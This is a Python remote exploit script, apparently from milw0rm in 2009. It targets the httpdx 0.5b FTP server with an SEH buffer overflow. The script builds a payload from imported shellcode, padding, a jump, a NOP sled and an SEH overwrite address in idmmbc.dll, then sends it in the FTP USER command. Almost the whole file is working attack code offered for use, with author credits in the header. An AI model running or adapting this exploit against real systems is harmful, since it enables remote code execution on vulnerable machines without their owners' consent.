#!/usr/bin/python
#[*] Usage : httpdx.py [target_ip]
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : httpdx <= 0.5b FTP Server (USER) Remote BOF Exploit (SEH)
#[*] Founder :  sico2819
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

#[x] Note : I used the case when idm is installed because its dll (idmmbc.dll) is loaded with httpdx.

import sys
import socket
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

    host = target_machine 

    # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
    

    payload =  buf
    payload += b'\x41'*(877 - len(buf))
    payload += b'\xE9\x8E\xFC\xFF\xFF'
    payload += b'\x90'*48
    payload += b'\x74\xC9\x90\x90'
    payload += b'\x87\x23\x02\x10'
    payload += b'\x44'*9000

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,target_port))
    s.recv(1024)
    s.send(b'USER '+payload+b'\r\n')
    
    s.close()

    # milw0rm.com [2009-05-18]